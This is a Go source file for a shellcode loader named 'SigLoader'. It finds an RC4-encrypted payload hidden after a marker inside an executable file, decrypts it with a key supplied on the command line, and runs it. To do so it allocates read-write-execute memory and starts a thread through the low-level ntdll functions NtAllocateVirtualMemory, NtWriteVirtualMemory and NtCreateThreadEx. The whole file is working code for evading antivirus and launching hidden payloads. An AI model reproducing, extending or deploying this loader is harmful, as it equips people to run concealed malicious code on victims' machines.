package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)



func scanPattern(peBytes []byte, pattern []byte) int{
	var max = len(peBytes) - len(pattern) + 1
	var j int
	for i := 0; i < max; i++ {
		if peBytes[i] != pattern[0] { continue}
		for j = len(pattern) - 1; j >= 1 && peBytes[i + j] == pattern[j]; j--{}
		if j == 0{return i}
	}
	return -1
}

func Decrypt(data []byte,encKey string)[]byte{
	keyLen := len(encKey)
	dataLen := len(data)
	var tmp byte
	result := make([]byte,dataLen)
	var j = 0
	var t = 0
	var i = 0
	var S [256]byte
	var T [256]byte


	for i = 0; i < 256; i++	{
		S[i] = uint8(i)
		T[i] = encKey[i % keyLen]
	}

	for i = 0; i < 256; i++	{
		j = (j + int(S[i]) + int(T[i])) % 256
		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp
	}
	j = 0
	for x := 0; x < dataLen; x++{
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256

		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp

		t = (int(S[i]) + int(S[j])) % 256

		result[x] = data[x] ^ S[t]
	}
	return result
}


func createTh(scci []byte,hand1e uintptr) {
	shellcode := append(scci,[]byte("0x00")[0])
	ntdll := windows.NewLazyDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

	//hand1e := uintptr(windows.CurrentProcess()) //special macro that says 'use this thread/process' when provided as a handle.
	var baseA uintptr
	regionsize := uintptr(len(shellcode))

	allocResult, _, err := ntAllocateVirtualMemory.Call(
		uintptr(hand1e),                   // HANDLE to the target process
		uintptr(unsafe.Pointer(&baseA)),   // Pointer that receives the allocated base address of the memory
		0,                                       // Number of zeros needed, can ignore this
		uintptr(unsafe.Pointer(&regionsize)), // Pointer to a UINT32 to received the total allocated size
		windows.MEM_COMMIT,                      // Memory options
		windows.PAGE_EXECUTE_READWRITE,          // Memory page security options
	)
	if allocResult > 0 {
		panic("NtAllocateVirtualMemory failed: " + err.Error())
	}

	//NtWriteVirtualMemory
	writeResult, _, err := ntWriteVirtualMemory.Call(
		uintptr(hand1e),
		uintptr(baseA),
		uintptr(unsafe.Pointer(&shellcode[0])),
		regionsize,
		0,
	)
	if writeResult > 0 {
		panic("NtWriteVirtualMemory failed: " + err.Error())
	}

	var threadHandle uintptr
	execResult, _, err := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		uintptr(hand1e),                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	if execResult > 0 {
		panic("NtCreateThreadEx failed: " + err.Error())
	}
	syscall.WaitForSingleObject(syscall.Handle(threadHandle), 0xffffffff)

}

func main(){
	if len(os.Args)<3 || os.Args[1] == "-h"{
		fmt.Println("help:\n    SigLoader.exe target.exe DecryptKey")
		os.Exit(0)
	}
	name := os.Args[1]
	encKey := os.Args[2]
	var tag = []byte{0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce}

	df, e := ioutil.ReadFile(string(name))
	if e != nil {
		fmt.Println("Could not load PE File")
		os.Exit(0)
	}
	fmt.Println("[+]:Scanning for Shellcode...")
	dataOffset := scanPattern(df,tag)
	if dataOffset == -1{
		fmt.Println("Could not locate data or shellcode")
		os.Exit(0)
	}
	pos := dataOffset+len(tag)
	fmt.Printf("[+]:Shellcode located at %x\n", pos)
	shellcode := df[pos:]
	data := Decrypt(shellcode,encKey)
	fmt.Println("[+]:Shellcode Decrypted")


	fmt.Println("[+]:Shellcode Executing")


	createTh(data,uintptr(0xffffffffffffffff))
}
